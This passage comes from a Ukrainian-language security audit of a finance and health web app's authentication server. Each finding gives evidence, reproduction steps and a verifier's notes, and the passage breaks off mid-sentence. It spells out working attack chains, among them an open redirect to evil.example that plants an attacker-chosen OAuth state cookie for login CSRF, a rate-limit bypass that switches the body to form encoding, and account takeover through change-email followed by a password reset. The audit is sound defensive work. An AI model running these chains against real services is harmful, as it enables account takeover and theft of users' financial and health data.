Better Auth 1.6.23: listSessions (dist/api/routes/session.mjs:371-397) повертає всі активні сесії користувача через parseSessionOutput, і поле token там не вирізається. get-session теж віддає session.token. Плагін bearer() без requireSignature (dist/plugins/bearer: токен без '.' сервер підписує сам) приймає сирий токен як повноцінний креденшел. Без bearer() вкрадений сирий токен був би марним: кука потребує HMAC-підпису. Це і є підсилювач. Відтворено: токен з list-sessions як Authorization: Bearer без куки дає GET /api/me 200. Окремо ця слабкість потребує XSS або помилки CORS, тому це defense-in-depth. Але через #1 вона вже зараз експлуатується, тож medium чесний. Поправка до рекомендації: просто вирізати token з list-sessions не можна. apps/web/src/core/profile/SessionsSection.tsx:174-181 відкликає сесію саме за token з listSessions, бо /revoke-session Better Auth валідує body.token. Потрібна заміна на відкликання за id (власний ендпоінт) або bearer({ requireSignature: true }) чи вимкнений bearer, поки мобільний контур на паузі (ADR-0094).
```

**Додаткові докази верифікатора:**

```text
v1.mjs: list-sessions → token present: true; Bearer reuse /api/me → 200 з email pool-користувача. Код: node_modules/better-auth/dist/api/routes/session.mjs:389-392; dist/db/schema.mjs:52 parseSessionOutput = filterOutputFields без вилучення token; auth.ts:617 plugins: [bearer(), expo()]. Попередній аудит security-comprehensive-2026-08-04.md:109-111 описував цей ланцюг (list-sessions → сирі токени → 7-денний bearer) лише як ланку localhost-CORS. Фікс тоді обмежився гейтом localhost, а саму видачу токенів не трекали.
```

### [medium] DELETE /api/me перевіряє пароль (scrypt) без жодного rate-limit: оракул пароля і DoS threadpool

- **ID:** `server-static-redo/route-authz#4` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера · повтор route-authz
- **Стан:** відкрито
- **Де:** apps/server/src/routes/me.ts:272-297; apps/server/src/modules/me/verifyAccountPassword.ts:38-54 (рядок 49: для акаунтів без credential пароль не потрібен)
- **Вплив:** Власник вкраденої сесії (наприклад, через знахідку про CORS чи bearer) підбирає пароль без обмежень і отримує постійний доступ, що переживе відкликання сесій, плюс пароль, який людина може використовувати деінде. Будь-який зареєстрований користувач може навантажити libuv-threadpool (scrypt близько 130 мс CPU на спробу) і загальмувати crypto- та fs-операції для всіх. OAuth-only акаунти ставляться на видалення без повторної автентифікації.
- **Що зробити:** Додати rateLimitExpress на DELETE /api/me (наприклад 5/15 хв на користувача і на IP) і тимчасове блокування після серії невдач. Для OAuth-only акаунтів вимагати свіжий re-auth (повторний вхід через провайдера).

**Докази:**

```text
4 поспіль невірні паролі від userA → 400 INVALID_PASSWORD кожен, 496/204/137/137 мс, жодного rate-limit заголовка (probe9.out). Базовий GET /api/me 14 мс. Роутер me має лімітери лише на /export і PUT /profile.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-redo-route-authz/probe9.mjs (стан не змінює).
```

**Верифікатор:**

```text
routes/me.ts:272-297: DELETE /api/me = requireFreshSession() + verifyAccountPassword. Жодного rateLimitExpress, і глобального лімітера на /api теж немає. requireFreshSession означає лише «сесія перевірена в БД, а не з cookie-кешу» (http/requireSession.ts:108-116), свіжості входу він не вимагає. Better Auth сам вважає перевірку пароля чутливою: getDefaultSpecialRules (dist/api/rate-limiter/index.mjs:370-376) обмежує /change-password до 3 запитів за 10 с на IP у проді. Цей роут робить ту саму звірку scrypt без обмежень і дає оракул пароля приблизно в 60-100 разів швидший для власника вкраденої сесії (через #1/#2 таку сесію зараз легко отримати). Хешування в Better Auth іде через node:crypto scrypt у libuv threadpool (dist/crypto/password.mjs:6), тож твердження про threadpool коректне. Гілка OAuth-only (verifyAccountPassword.ts:49) справжня, але її вплив менший: видалення відкладене на 30 днів і відновлюване через /api/me/restore.
```

**Додаткові докази верифікатора:**

```text
v4.mjs: 25 паралельних DELETE /api/me з невірними паролями на власному pool-користувачі → 25×400 INVALID_PASSWORD за 1135 мс (≈22 спроби/с з одного клієнта), жодного заголовка RateLimit. Після прогону GET /api/me 200, deletion-status {pending:false}, стан не змінено. Окремого трекінгу в docs/work/specs/audits не знайдено (grep DELETE /api/me, verifyAccountPassword, INVALID_PASSWORD).
```

### [medium] Expo-плагін відкриває open redirect і дає підставити підписану `state`-куку OAuth (login CSRF через Google)

- **ID:** `server-static/auth-session#2` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/auth.ts:617 (`plugins: [bearer(), expo()]`); node_modules/@better-auth/expo/dist/index.js:7-34 (`/expo-authorization-proxy`); node_modules/better-auth/dist/state.mjs:110-121 (database-стратегія state: єдина прив'язка до браузера — підписана кука `state`)
- **Вплив:** Open redirect з API-домену (фішинг під довіреним хостом) і OAuth login CSRF: жертва непомітно опиняється в акаунті атакера і вносить туди свої фінансові/медичні дані або підключає банк (mono/connect пропустить — email атакера в Google підтверджений), які атакер потім читає.
- **Що зробити:** Мобільний контур на паузі (ADR-0094): прибрати `expo()` з прод-конфігу або закрити маршрут через `disabledPaths: ["/expo-authorization-proxy"]`; якщо він потрібен — обмежити `authorizationURL` allowlist-ом хостів провайдерів (accounts.google.com, appleid.apple.com) і не довіряти `state` з query. Перевірити, чи upstream @better-auth/expo це вже виправив.

**Докази:**

```text
GET /api/auth/expo-authorization-proxy?authorizationURL=https%3A%2F%2Fevil.example%2Fphish%3Fstate%3DATTACKER_STATE_123
→ 302 Location: https://evil.example/phish?state=ATTACKER_STATE_123
→ Set-Cookie: better-auth.state=ATTACKER_STATE_123.TD7%2Fzti...; Max-Age=300; Path=/; HttpOnly; SameSite=Lax
З `&oauthState=X` → Set-Cookie: better-auth.oauth_state=X. Працює і через /api/v1/auth/... Ендпоінт анонімний (GET, без CSRF-гейту, бо /api/auth/* exempt), перевіряє лише https: і «не наш origin».
parseGenericState (database strategy): verification-рядок за `state` + `stateCookieValue === state` — саме цю куку тепер можна виставити жертві будь-яким значенням, підписаним нашим секретом.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-auth-session/expo-proxy.mjs. Ланцюг (потрібен Google у проді): 1) атакер робить POST /api/auth/sign-in/social {provider:google} зі свого клієнта, отримує state S і проходить Google своїм акаунтом, не відкриваючи callback (бере code C); 2) жертва відкриває сторінку атакера → навігація на /api/auth/expo-authorization-proxy?authorizationURL=https://evil/?state=S (жертві ставиться підписана state=S) → evil редіректить на /api/auth/callback/google?code=C&state=S → state-кука збігається, PKCE-verifier береться з БД → жертва залогінена в акаунт атакера.
```

**Верифікатор:**

```text
Open redirect і підстановку state-куки відтворено наживо, ланцюг login CSRF підтверджено читанням коду. `@better-auth/expo` 1.6.20 `/expo-authorization-proxy` (dist/index.js:7-34) анонімний (GET). Він перевіряє лише `https:` і що origin не наш, далі робить `setSignedCookie('state', <state з query>)` і редіректить на будь-який хост. Express-роутер монтує весь `/api/auth/{*splat}` без allowlist (routes/auth.ts:33), а `requireCsrfHeader` `/api/auth/*` пропускає. Better Auth сесію зберігає в БД, тож `storeStateStrategy` = "database" (create-context.mjs:136). Тоді `parseGenericState` (state.mjs:99-118) до браузера прив'язує лише рівність підписаної куки `state` і параметра `state`, а саме цю куку проксі ставить жертві з довільним значенням. PKCE-verifier береться з verification-рядка атакера, тож обмін коду пройде. Google у проді є (кнопка на AuthPage, env-vars.md). Мобільний контур на паузі (ADR-0094), а плагін у прод-конфігу активний. Severity medium: для повного ланцюга потрібен Google і участь атакера у флоу, а open redirect сам по собі був би low.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-auth-session/v2-expo.mjs (лог v2-expo.log), запити без Origin і X-Requested-With:
GET /api/auth/expo-authorization-proxy?authorizationURL=https://evil.example/phish?state=ATTACKER_STATE_V → 302 Location: https://evil.example/phish?state=ATTACKER_STATE_V, Set-Cookie: better-auth.state=ATTACKER_STATE_V.<hmac>; Max-Age=300; HttpOnly
/api/v1/auth/... → 302 + better-auth.state=S2.<hmac>; SameSite=Lax
&oauthState=OSTATE → 302 + better-auth.oauth_state=OSTATE; Max-Age=600
http:-URL → 400 (перевіряється лише схема).
Згадок про expo-authorization-proxy/open redirect у docs/work/specs/audits і docs/open-work.md немає.
```

### [medium] Per-account ліміт входу (F2) обходиться тілом `application/x-www-form-urlencoded`

- **ID:** `server-static/auth-session#3` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/http/authMiddleware.ts:71-104 (ключ = req.body.email); apps/server/src/http/bodySizePolicy.ts (дефолт `/` = express.json, лише application/json); node_modules/better-auth/dist/api/routes/sign-in.mjs:155 (allowedMediaTypes: urlencoded + json); node_modules/better-call/dist/adapters/node/request.mjs (сирий потік ще читабельний → Better Auth парсить форму сам)
- **Вплив:** Розподілений credential-stuffing на один акаунт знову масштабується кількістю IP: лишається тільки per-IP бакет 5/хв (а в проді за Vercel-проксі IP ще й схлопується, див. audit 1.1). Додатково brute-force-тріаж сліпне: у auth_event немає emailHash.
- **Що зробити:** Додати `express.urlencoded({ limit: "16kb", extended: false })` для `/api/auth` до лімітерів, або в authAccountRateLimit читати email з будь-якого підтримуваного content-type (або відхиляти 415 усе, крім application/json, на sign-in/reset). Покрити тестом urlencoded-гілку.

**Докази:**

```text
Дві спроби з неправильним паролем проти одного акаунта (лог <scratch>/agents/server-static-auth-session/probe5.log):
JSON  → 401 INVALID_EMAIL_OR_PASSWORD, auth_event {outcome:bad_credentials, emailHash:"ff5db237fb7a"}
FORM  → 401 INVALID_EMAIL_OR_PASSWORD, auth_event {outcome:bad_credentials, emailHash: (відсутній)}
Тобто для form-тіла `req.body` у middleware порожнє: `const email = typeof body.email === "string" ? ... : ""; if (!email) { next(); return; }` → бакет `a:<sha256(email)>` не рахується, а Better Auth пароль усе одно перевіряє.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-auth-session/probe5.mjs (2 запити на /api/auth/sign-in/email: JSON і urlencoded з тими самими email/паролем; порівняти auth_event у server.log).
```

**Верифікатор:**

```text
Відтворено наживо через таблицю `rate_limit_buckets`. `authAccountRateLimit` (http/authMiddleware.ts:87-92) бере email з `req.body`, а `bodySizePolicy` для `/api/auth` має тільки дефолтний `express.json` (urlencoded-парсера немає ніде), тож для form-тіла `req.body` порожній і middleware робить `next()`, не чіпаючи бакет. `/sign-in/email` у Better Auth явно приймає `application/x-www-form-urlencoded` (sign-in.mjs:155), читає сирий потік сам і перевіряє пароль. Обхід стосується саме входу: endpoints скидання пароля приймають лише JSON, urlencoded дозволено тільки sign-in/sign-up/callback. F2 у beta-security-readiness.md позначено «Готово» (свого часу High, MUST-FIX до бети), а захист обходиться зміною Content-Type. Per-IP бакет при цьому діє.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-auth-session/v3-form.mjs (лог v3-form.log, audit_pool129):
account bucket before: (no row)
FORM wrong pw → 401 INVALID_EMAIL_OR_PASSWORD; bucket after FORM: (no row)
JSON wrong pw → 401; bucket after JSON: api:auth:account|1
FORM correct pw → 200 + session cookies (form-вхід повністю робочий); bucket лишився |1.
```

### [medium] Непідтверджений акаунт: `change-email` миттєво перепривʼязує адресу без пароля — украдена сесія → скидання пароля → захоплення акаунта

- **ID:** `server-static/auth-session#4` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/auth.ts:331-342 (`updateEmailWithoutVerification: true`), 368 (REQUIRE_EMAIL_VERIFICATION default false, env/env.ts:85-88); node_modules/better-auth/dist/api/routes/update-user.mjs:375-450
- **Вплив:** Будь-яка короткочасна крадіжка сесії (XSS, спільний пристрій, 5-хвилинне вікно кешу) для непідтвердженого акаунта перетворюється на постійне захоплення з усіма місяцями даних; власник не отримує жодного сповіщення.
- **Що зробити:** Вимагати поточний пароль (або свіжу сесію, freshAge) для change-email незалежно від verified-стану; надсилати повідомлення на стару адресу і в гілці без верифікації; розглянути `updateEmailWithoutVerification: false` (лист на нову адресу без зміни email до кліку).

**Докази:**

```text
Наживо (probe2, одноразовий audit_pool67, emailVerified=false):
POST /api/auth/change-email {newEmail:"ssa_rebound_...@example.com"} → 200 {"status":true}
GET /api/auth/get-session?disableCookieCache=true → user.email = ssa_rebound_1790894804341@example.com, emailVerified false
Ні пароля, ні свіжості сесії, ні листа на стару адресу не вимагається (canUpdateWithoutVerification гілка: `updateUserByEmail(old, {email: newEmail})`). Після цього `/request-password-reset` на нову адресу дає атакеру токен, а `revokeSessionsOnPasswordReset` вибиває власника.
```

**Відтворення:**

```text
Залогінитись як будь-який непідтверджений користувач (дефолт: REQUIRE_EMAIL_VERIFICATION=false, усі акаунти до H6 і всі, хто не клікнув лист) → POST /api/auth/change-email {newEmail: attacker@...} з X-Requested-With/Origin → 200 → POST /api/auth/request-password-reset {email: attacker@...}.
```

**Верифікатор:**

```text
Відтворено наживо. `changeEmail` (update-user.mjs:375-450) для `emailVerified !== true` при `updateEmailWithoutVerification: true` (auth.ts:333) одразу робить `updateUserByEmail(old,{email:new})`. Пароля він не просить, freshAge не дивиться, на стару адресу нічого не надсилає. Поведінку задокументовано як навмисну (коментар auth.ts:316-329: «власність над старим ящиком ніколи не була доведена»), але сценарій «вкрадена сесія → перепривʼязка → reset → `revokeSessionsOnPasswordReset` вибиває власника» обґрунтування не покриває. Небезпечний сам намір: тимчасова крадіжка сесії перетворюється на постійне захоплення, а `REQUIRE_EMAIL_VERIFICATION` за замовчуванням false. Одна поправка до опису знахідки: «5-хвилинне вікно кешу» тут не працює як вектор. `change-email` стоїть на `sensitiveSessionMiddleware` (авторитетна перевірка в БД), тож відкликана сесія, зокрема продовжена через #1, сюди не пройде. Потрібна жива вкрадена сесія.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-auth-session/v4-misc.mjs (лог v4-misc.log, audit_pool129, emailVerified=f):
POST /api/auth/change-email {newEmail:vssa_rebound_1790904830695@example.com} (без пароля) → 200 {status:true}
DB: email = vssa_rebound_1790904830695@example.com verified=false.
У docs/work/specs/launch/email-verification-sweep.md є тільки факт, що changeEmail увімкнено, без цього ризику.
```

### [medium] Сільпо OAuth: state не привʼязаний до браузера, тож фішингове посилання привʼязує Сільпо-акаунт жертви до Sergeant-акаунта зловмисника

- **ID:** `server-static/idor-rls#3` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/routes/silpo.ts:103-133 (connectHandler), 135-224 (callbackHandler, коментар 172-197); apps/server/src/modules/silpo/oauth.ts:246-265
- **Вплив:** Зловмисник отримує історію покупок жертви в Сільпо (чеки, позиції, магазини, час) і може керувати її кошиком (/api/silpo/cart/apply), лише переконавши жертву натиснути справжнє посилання Сільпо і погодитися (вікно 10 хв). Стосується лише проду з увімкненою інтеграцією.
- **Що зробити:** Привʼязати state до агента користувача, який почав потік: на /connect ставити HttpOnly SameSite=Lax cookie (на домені API) з nonce і звіряти її в колбеку. Інший варіант: проміжний екран у вебі після колбеку, де залогінений користувач підтверджує привʼязку і сервер звіряє сесію з pending.userId. Виправити коментар у callbackHandler, бо він виправдовує небезпечну поведінку.

**Докази:**

```text
connectHandler: `const { url } = await buildAuthorizationUrl({ userId, redirectUri }); res.redirect(302, url);` - URL зі state зловмисника можна взяти з Location. callbackHandler без сесії: `const pending = await consumeAuthorizationState(state); ... const userId = pending.userId; ... exchangeCode({ code, codeVerifier: pending.codeVerifier, ... }); await persistTokens(userId, ring, ...)`. Коментар розглядає лише атаку «зловмисник підсовує свій code» і робить висновок: «Підсунутий чужий `state` привʼяже токени до акаунта того, хто цей `state` замовив, — тобто до самого зловмисника», а це і є шкода: токени ЖЕРТВИ опиняються в акаунті зловмисника. Локально не підтверджено: GET /api/silpo/connect -> 503 SILPO_DISABLED (SILPO_ENABLED=false за замовчуванням, env.ts:353).
```

**Відтворення:**

```text
За SILPO_ENABLED=true: зловмисник під своєю сесією робить GET /api/silpo/connect із redirect: manual і забирає Location (authorize-URL Сільпо зі своїм state, PKCE verifier лежить на сервері). Він надсилає це посилання жертві. Жертва логіниться в Сільпо і дає згоду, колбек обмінює code і зберігає токени жертви під userId зловмисника. Далі зловмисник викликає POST /api/silpo/sync і GET /api/silpo/receipts.
```

**Верифікатор:**

```text
Логіку перевірено в коді без двозначностей; наживо не відтворено, бо локально SILPO_ENABLED=false і обидва роути дають 503. connectHandler (під requireSession) кладе state з userId ініціатора в silpo_oauth_state і віддає 302 на authorize-URL Сільпо, який зловмисник забирає з Location. callbackHandler стоїть ДО requireSession і бере власника виключно з `pending.userId`; PKCE verifier теж лежить на сервері під цим state. Нічого, що прив'язувало б state до браузера, який почав потік (cookie, nonce), немає. Тест silpo.route.test.ts фіксує саме це: токени зберігаються «на власника state» без сесії. Отже, якщо жертва відкриє посилання зловмисника і дасть згоду в Сільпо, її токени ляжуть в акаунт зловмисника. Коментар у колбеку розглядає лише класичний login-CSRF (підсунутий code) і робить хибний висновок «привʼяже до самого зловмисника — не шкода», хоча прив'язуються саме токени жертви. Це відома вимога RFC 9700 (state/PKCE мають бути прив'язані до user agent). Medium лишаю: потрібні увімкнена інтеграція, соціальна інженерія і згода жертви на екрані Сільпо, а вікно 10 хв. Поки SILPO_ENABLED=false (env.ts за замовчуванням), вразливість латентна.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-idor-rls/v3-silpo.mjs: connect -> 503 SILPO_DISABLED, callback -> 503 SILPO_DISABLED. apps/server/src/routes/silpo.ts:182-197 (коментар-обґрунтування), :198 `const userId = pending.userId`. Вебклієнт іде на /connect top-level навігацією (SilpoIntegrationSection.tsx:192), тож пропонований фікс з HttpOnly cookie на API-домені технічно здійсненний. У docs/start/instructions/enable-silpo-integration.md:101-109 і в спеці silpo-mcp-integration.md ризик forwarding-атаки не згадано.
```

### [medium] Після переходу на білд у Coolify (ADR-0102) ніхто не передає GIT_SHA: в образі порожній build id, Sentry release і X-Server-Build-Id

- **ID:** `server-static/reliability-ops#4` · **Вердикт:** підтверджено · **Категорія:** `config` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** Dockerfile.api:246-254 (`ARG GIT_SHA=""` з коментарем «deploy-api.yml passes --build-arg GIT_SHA»); .github/workflows/deploy-api.yml (лише POST $COOLIFY_URL/api/v1/deploy?uuid=..., build-arg немає); apps/server/src/http/buildIdHeader.ts:23-40; apps/server/src/sentry.ts:218-232; apps/server/src/obs/logger.ts:285-287
- **Вплив:** Middleware не ставить `X-Server-Build-Id` (buildIdHeader повертає null), тож детектор розбіжності клієнт/сервер у SW (autoUpdate.ts) мовчки вимкнений і не форсує оновлення після деплою. Sentry-події без release: прив'язка інцидентів до коміту й source maps на бекенді зламана. `app_build_info` без коміту. Рунбук run-beta-wave.md (крок 4) звіряє свіжість саме за цим заголовком і дасть хибний результат.
- **Що зробити:** Додати `SOURCE_COMMIT` (Coolify: «Include Source Commit in Build») у каскади buildIdHeader/sentry/logger або в Dockerfile `ARG SOURCE_COMMIT` + `ENV GIT_SHA=${SOURCE_COMMIT}`. Оновити застарілі коментарі Dockerfile про ghcr/build-arg. Після деплою звірити, що `X-Server-Build-Id` дорівнює коміту з `pnpm deploy:status`.

**Докази:**

```text
`grep -rn "GIT_SHA\|build-arg" .github/workflows/*.yml` нічого не знаходить. deploy-api.yml:17-18: «Білд іде на сервері: Coolify сам клонує `main` з GitHub і збирає `Dockerfile.api`. Образу в ghcr.io більше немає». Каскади `resolveServerBuildId`/`resolveSentryRelease` читають SENTRY_RELEASE -> GIT_SHA -> VERCEL_GIT_COMMIT_SHA -> GITHUB_SHA -> BUILD_ID; Coolify-івського `SOURCE_COMMIT` серед них немає. Ні scripts/deploy-api.mjs, ні жоден workflow не виставляє GIT_SHA.
```

**Відтворення:**

```text
Після деплою з 2026-09-30: `curl -sI https://<api>/health | grep -i x-server-build-id` (очікувано: заголовка немає, якщо в Coolify вручну не задано build-змінну). У Sentry події бекенду без release.
```

**Верифікатор:**

```text
Перевірено в коді і на проді. Dockerfile.api:246-254 досі має `ARG GIT_SHA=""` з коментарем про ghcr і `--build-arg` з deploy-api.yml. Сам deploy-api.yml (рядки 17-18) каже, що білд іде в Coolify з клону main, і жодного build-arg не передає (grep GIT_SHA/build-arg/SOURCE_COMMIT по .github/workflows і scripts порожній). Каскади resolveServerBuildId (buildIdHeader.ts:26-32) і resolveSentryRelease (sentry.ts:220-225) не читають SOURCE_COMMIT від Coolify. serverBuildIdMiddleware змонтований до registerRoutes (app.ts:140), тож заголовок мав би бути і на /health. Medium залишаю: у проді мовчки вимкнено одразу кілька ops-функцій (жорсткий поріг розбіжності збірок у SW, Sentry release, app_build_info, перевірка з кроку 4 рунбука). Перевірку деплою в deploy-api.yml це не зачіпає, бо вона звіряє коміт через Coolify API.
```

**Додаткові докази верифікатора:**

```text
Один read-only GET на прод (verify-server-static-reliability-ops/prod-hdrs.mjs): https://api.sergeant.com.ua/health повертає 200 з x-request-id, x-trace-id і helmet-заголовками, тобто відповідає сам Express, але X-Server-Build-Id немає. /api/status віддає `access-control-expose-headers: Retry-After, X-Server-Build-Id`, а сам заголовок відсутній. Отже, у проді не задано жодної змінної каскаду (SENTRY_RELEASE/GIT_SHA/...), і Sentry release теж undefined. run-beta-wave.md:328 досі стверджує, що «Coolify тягне готовий образ».
```

### [medium] SSE /api/v2/sync/stream лишається відкритим і стрімить живі дані після sign-out, без ліміту з'єднань і часу життя; веб-клієнт його не використовує

- **ID:** `server-static/sync-contract#7` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/modules/sync/syncV2Stream.ts:214-412 (сесія перевіряється лише на handshake, listener живе до close, немає max-age і per-user ліміту, setMaxListeners(1000)); apps/server/src/routes/sync.ts:90-98; apps/server/src/http/timeout.ts:54-60 (SSE виключено з таймауту)
- **Вплив:** Викрадена cookie дає безстроковий живий канал фінансових і health-даних жертви, і його не обриває ні sign-out, ні «вийти з усіх пристроїв», ні зміна пароля. Крім того, 30 нових стрімів на хвилину на юзера без стелі одночасних з'єднань накопичують сокети й таймери, і це вектор вичерпання ресурсів. Endpoint не потрібен жодному клієнту, тож це чиста attack surface.
- **Що зробити:** Вимкнути маршрут, поки немає споживача (або закрити за фіче-прапорцем). Якщо лишати: періодично (наприклад, на кожному heartbeat) перевіряти сесію з обходом cookieCache і закривати стрім; обмежити max-age (наприклад, 15 хв) і кількість одночасних стрімів на юзера; підписатися на подію відкликання сесій.

**Докази:**

```text
sse-revoke3.mjs (власний pool-юзер ssync2): stream S1 200; sign-out S1 200 о 23:08:23; через 5.5 хв `S1 /api/me after 5.5 min 401`, тобто cookie-cache вже не рятує сесію. Після цього push із S2 і результат: `revoked S1 stream received op pushed 5.5 min after sign-out: true`. У apps/web/src жодного посилання на sync/stream чи EventSource.
```

**Відтворення:**

```text
node <scratch>/agents/server-static-sync-contract/sse-revoke3.mjs (~7 хв: sign-in ×2, stream, sign-out, очікування 330 с, push)
```

**Верифікатор:**

```text
syncV2Stream checks the session only on handshake (requireSession in routes/sync.ts). After that the opLogEmitter listener lives until req/res close. Nothing re-checks the session, and there is no max-age and no per-user connection limit. Heartbeats keep proxies from closing the connection for idleness. requestTimeout skips SSE. apps/web has no EventSource or sync/stream consumer. The 2026-08-05 orphaned-code audit records only that the endpoint has no consumer and is kept for Phase 3, not the session-revocation bypass. Mitigating factors: the attacker must hold the cookie before it is revoked, and in prod every deploy restarts the process and breaks the stream. So 'безстроковий' is limited by how often deploys happen, and medium is fair.
```

**Додаткові докази верифікатора:**

```text
node <scratch>/agents/verify-server-static-sync-contract/v3-sse.mjs (user vssc3, fresh session S1 for the stream, storageState session S2 for push):
S1 /api/me before 200
stream S1 200 text/event-stream; charset=utf-8
sign-out S1 200 2026-10-02T02:02:01.706Z
S1 /api/me after 5.5 min 401 stream closed by server? false
push S2 200
heartbeats seen: 13 | revoked S1 stream received op pushed 5.5 min after sign-out: true
```

### [medium] /api/nutrition/refine-photo — повноцінний vision-аналіз довільного фото без жодної квоти

- **ID:** `server-static/webhooks-billing-quota#6` · **Вердикт:** підтверджено · **Категорія:** `authz` · **Лейн:** Статика сервера
- **Стан:** відкрито
- **Де:** apps/server/src/routes/nutrition.ts:117-130; packages/shared/src/schemas/api.ts:723-740
- **Вплив:** Обхід Premium-фічі «фото без ліміту» (ai.photo Free = 3/тиждень) і необмежені vision-виклики на рахунок власника (~8–9 тис./добу з одного акаунта).
- **Що зробити:** Списувати з week:photo і на refine-photo, або видавати на analyze-photo одноразовий серверний токен (прив'язаний до хешу зображення/юзера, з TTL) і приймати refine лише з ним.

**Докази:**

```text
routes/nutrition.ts:125-129: `// ponytail: refine не має власної квоти, стелю тримає лише rate limit 20/хв` → ланцюг `requireHealthConsent(), requireLlmUpstream("vision"), refinePhoto` без requireAiQuota. RefinePhotoSchema вимагає лише `image_base64` (100..7 000 000), `prior_result` — optional; тобто запит не мусить бути продовженням analyze-photo.
```

**Відтворення:**

```text
Free-юзер зі згодою на health-дані після вичерпання 3 фото/тиждень (analyze-photo → 429 AI_PHOTO_QUOTA) шле POST /api/nutrition/refine-photo {image_base64:<нове фото>} → отримує КБЖВ-аналіз; до ~6 запитів/хв (limit 20, cost 3).
```

**Верифікатор:**

```text
Підтверджено в коді. /api/nutrition/refine-photo має ланцюг rateLimit(20/хв, cost 3) → requireHealthConsent → requireLlmUpstream("vision") → refinePhoto, а requireAiQuota("photo") є лише на analyze-photo. requireLlmUpstream перевіряє ключ і квотою не є. RefinePhotoSchema вимагає лише image_base64, prior_result опційний. Промпт SYSTEM при нульовому чи null попередньому результаті велить «оціни заново» і повертає повний КБЖВ-розбір, тобто refine рівноцінний analyze. Free має ai.photo = 3/тиждень (entitlements.ts), а через refine — до ~6/хв. Коментар у коді («ponytail: refine не має власної квоти … окреме відро, якщо refine почнуть ганяти без analyze») показує, що розрив відомий і свідомо відкладений. Але прийняте рішення спирається на припущення «refine лише після analyze», яке сервер не перевіряє, тож намір сам по собі небезпечний: Free отримує безлімітний vision-шлях. Бюджет-гвард Anthropic лише алертить.
```

**Додаткові докази верифікатора:**

```text
routes/nutrition.ts:100-104 analyze-photo: `requireAiQuota("photo")`; :117-130 refine-photo без requireAiQuota, з коментарем ponytail. refine-photo.ts:37-39 «Якщо в ньому КБЖВ нульові або null … оціни заново». packages/shared/src/billing/entitlements.ts:41-45 `"ai.photo": { free: { perWeek: 3 } }`. product-knowledge-nutrition.md:328 згадує старий requirePlan-гейт на refine, а цей гейт уже прибрано.
```

## low

### [low] Відкликана сесія може лишатися чинною до 5 хв через session cookieCache (статичне спостереження, live не підтверджено)

- **ID:** `api-live/auth-flows-live#1` · **Вердикт:** підтверджено · **Категорія:** `auth-session` · **Лейн:** Живе API
- **Стан:** відкрито
- **Уже відстежується:** docs/work/specs/audits/security-comprehensive-2026-08-04.md (§1.6, cookieCache.maxAge=300) + docs/work/specs/audits/2026-08-05-orphaned-code-audit.md (§7а, requireFreshSession підключено лише на export/delete/bank; решта роутів навмисно кешовані); прийнято в docs/governance/adr/0017-better-auth-choice-and-session-model.md (ADR-7.2)
- **Де:** apps/server/src/auth.ts:424-431 (session.cookieCache maxAge 300s), apps/server/src/auth.ts:714-726 (getSessionUser без disableCookieCache), apps/server/src/auth.ts:802-811 (getFreshSessionUser лише для окремих поверхонь)
- **Вплив:** Після sign-out, відкликання сесії чи скидання пароля викрадений cookie може працювати ще до 5 хвилин на більшості маршрутів. Компроміс задокументований у коді як навмисний, тому це defense-in-depth, а не прямий обхід.
- **Що зробити:** Підтвердити live; для дій, що змінюють стан облікового запису (зміна email/пароля, керування сесіями), використовувати getFreshSessionUser; розглянути зменшення maxAge cookieCache або інвалідацію кешу при revoke.

**Докази:**

```text
session: { expiresIn: 60*60*24*7, updateAge: 60*60*24, cookieCache: { enabled: true, maxAge: 60 * 5 } }  ...  getFreshSessionUser: 'Той самий резолв сесії, але в обхід 5-хвилинного session.cookieCache: відкликана сесія перестає проходити негайно, а не за кеш-вікно ... лишаємо це для поверхонь ... повний експорт даних, видалення акаунта, привʼязка банку.'
```

**Відтворення:**

```text
Не відтворено live у цьому раунді. Перевірка для follow-up: на throwaway-акаунті відкликати сесію (sign-out / revoke-session / reset пароля) і протягом 5 хв повторити звичайний GET на /api/* зі старим набором cookie; очікувано — запит проходить на маршрутах, що використовують getSessionUser без disableCookieCache.
```

**Верифікатор:**

```text
Відтворив live (agents/verify-api-live-auth-flows-live/revoke.mjs, пул-юзер audit_pool134). Після POST /api/auth/sign-out (200, DB-сесію видалено) повна вкрадена пара session_token+session_data лишалась робочою: GET /api/me = 200 на t+0..271s і 401 лише на t+301s, тобто вікно рівно cookieCache.maxAge=300. Продовжити вікно не можна: у better-auth 1.6.23 cookieRefreshCache для stateful-конфігу = false (context/create-context.mjs:149), тож cookie не перевипускається без DB. Поведінка навмисна і прийнята: ADR-0017 § ADR-7.2 прямо каже «Revoke working (з 5-хв latency, acceptable)», а routes/fresh-session.route.test.ts стверджує, що stale-сесія ПРОХОДИТЬ GET /api/me (це контроль того, що на DB-lookup переведено не все). Частина рекомендації вже виконана: change-email, change-password, revoke-*-sessions і delete-user у Better Auth 1.6.23 стоять під sensitiveSessionMiddleware → getAuthoritativeSessionFromCtx (в обхід кешу). Live: stale cookie на POST /api/auth/change-email і /api/auth/revoke-other-sessions дає 401, на /api/me/export теж 401 (requireFreshSession). Low лишаю, а не знижую до info, через один нюанс, який знахідка не називає: GET /api/v2/sync/pull (requireSession, кешований) у вікні віддає 200, а з since=0 він посторінково віддає весь розшифрований sync_op_log користувача. Отже fresh-session-гейт на /api/me/export, який закривав саме сценарій «за 5 хв повний дамп» з аудиту 2026-08-04 § 1.6, у цьому вікні можна обійти. Додаткова вигода атакувальника мала: вкрадений cookie і до 